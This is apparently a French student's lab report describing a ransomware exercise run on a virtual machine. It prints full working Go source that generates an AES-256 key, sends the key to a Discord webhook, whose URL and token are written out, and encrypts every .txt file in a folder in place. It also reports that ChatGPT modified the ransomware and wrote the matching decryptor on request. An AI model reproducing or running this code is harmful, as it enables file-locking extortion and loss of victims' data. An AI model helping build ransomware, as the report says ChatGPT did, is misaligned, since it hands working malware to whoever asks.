# TP 3
1. Pour le server et le Webhok j'ai utilisé ceux des TP précédents
2. pour le script j'ai piqué [celui ci](https://gist.github.com/donvito/efb2c643b724cf6ff453da84985281f8)
\
avec ChatGPT je l'ai modifié pour qu'il chiffre "C:\Users\Fsaint\Desktop\test\mdp.txt" en particulier et qu'il envoie la clé de déchiffrement sur mon WebHook
\
Le script final : 
```
package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"path/filepath"
)

func main() {
	// Générer une clé aléatoire pour AES-256
	bytes := make([]byte, 32) // 32 bytes = 256 bits
	if _, err := rand.Read(bytes); err != nil {
		panic(err.Error())
	}

	// Encoder la clé en string hexadécimale
	key := hex.EncodeToString(bytes)
	fmt.Printf("Clé générée pour le chiffrement : %s\n", key)

	// Envoyer la clé au webhook
	sendKeyToWebhook(key, "https://discord.com/api/webhooks/1290310869024112713/QazJoLT-VbGBLiJ0GqlZkXWoTwLBoiLF8EeuIOegBDUYpOaV_Rnj5jmZ7jZPyrHg1PoS")

	// Chemin vers le dossier contenant les fichiers .txt
	folderPath := `C:\Users\paph\Desktop\test`

	// Parcourir tous les fichiers .txt dans le dossier
	files, err := filepath.Glob(filepath.Join(folderPath, "*.txt"))
	if err != nil {
		panic(err)
	}

	// Pour chaque fichier, lire et chiffrer son contenu
	for _, file := range files {
		content, err := ioutil.ReadFile(file)
		if err != nil {
			fmt.Printf("Erreur lors de la lecture du fichier %s: %v\n", file, err)
			continue
		}

		// Chiffrer le contenu du fichier
		encrypted := encrypt(string(content), key)

		// Remplacer le contenu du fichier par la version chiffrée
		err = ioutil.WriteFile(file, []byte(encrypted), 0644)
		if err != nil {
			fmt.Printf("Erreur lors de l'écriture du fichier %s: %v\n", file, err)
			continue
		}

		fmt.Printf("Fichier %s chiffré avec succès.\n", file)
	}
}

// Fonction pour envoyer la clé au webhook Discord
func sendKeyToWebhook(key string, webhookURL string) {
	payload := fmt.Sprintf(`{"content": "Clé générée : %s"}`, key)
	_, err := http.Post(webhookURL, "application/json", bytes.NewBuffer([]byte(payload)))
	if err != nil {
		fmt.Printf("Erreur lors de l'envoi de la clé au webhook : %v\n", err)
	}
}

func encrypt(stringToEncrypt string, keyString string) (encryptedString string) {
	key, _ := hex.DecodeString(keyString)
	plaintext := []byte(stringToEncrypt)

	// Créer un nouveau bloc de chiffrement avec la clé
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err.Error())
	}

	// Créer un GCM
	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}

	// Créer un nonce
	nonce := make([]byte, aesGCM.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		panic(err.Error())
	}

	// Chiffrer les données en utilisant aesGCM.Seal
	ciphertext := aesGCM.Seal(nonce, nonce, plaintext, nil)
	return fmt.Sprintf("%x", ciphertext)
}
```
3. je l'ai rendu executable puis executé sur ma vm 
\
Fichier original : 
![mdp](mdptxt.png)
Fichier chiffré :
![chiffré](chiffré.png)
resultat sur le server
![webhook](webhook.png)
4. decrypt tool fait entièrement par ChatGPT a partir du encrypt tool
donc quand je l'execute il demande la clé
![decrypt](decrypt.png)
apres que la clé soit rentrée le fichier texte retrouve les données d'origine
![cbon](retouralanormale.png)